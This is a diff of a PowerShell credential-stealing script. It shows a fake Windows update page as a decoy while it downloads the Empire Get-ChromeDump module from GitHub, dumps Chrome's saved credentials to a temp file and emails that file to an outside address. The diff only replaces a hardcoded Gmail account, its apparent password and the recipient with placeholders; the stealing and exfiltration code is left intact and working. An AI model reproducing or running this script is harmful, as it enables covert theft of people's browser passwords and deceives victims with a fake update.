@@ -1,8 +1,8 @@
 start-job -scriptblock {C:\Progra~1\Intern~1\iexplore.exe -k http://fakeupdate.net/win10u/index.html} 1>$null
 $url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1"
 $output = "$env:temp\file.psm1"
-$Username = "testmathitest@gmail.com";
-$Password = "DragonSlayer96";
+$Username = "your email ";
+$Password = "your password";
 $path = "C:\Users\win10\AppData\Local\Temp\dumped.txt";
 (New-Object System.Net.WebClient).DownloadFile($url,$output)
 if(Get-Process -Name Chrome -ea SilentlyContinue)
@@ -29,7 +29,7 @@ function Send-ToEmail([string]$email, [string]$attachmentpath){
     $smtp.send($message);
     $attachment.Dispose();
  }
-Send-ToEmail  -email "9tamilmathi@gmail.com" -attachmentpath $path 2>$null;
+Send-ToEmail  -email "to-address-email" -attachmentpath $path 2>$null;
 Start-Sleep -Seconds 10
 Get-Process -Name iexplore | Stop-Process
 
